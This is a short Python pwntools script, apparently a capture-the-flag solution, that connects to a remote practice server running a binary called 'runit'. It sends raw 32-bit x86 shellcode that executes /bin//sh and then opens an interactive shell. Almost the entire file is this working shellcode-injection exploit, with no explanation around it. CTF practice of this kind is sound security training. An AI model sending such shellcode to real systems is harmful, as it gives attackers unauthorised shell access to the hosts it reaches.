#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.arch = 'i386'

local = 0
if local == 1:
    r=process('./runit')
    gdb.attach(r,"b * 0x080485F9")
else:
    r = remote('node4.buuoj.cn',28580)

elf=ELF('./runit')

sc = "\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"
r.send(sc)


r.interactive()
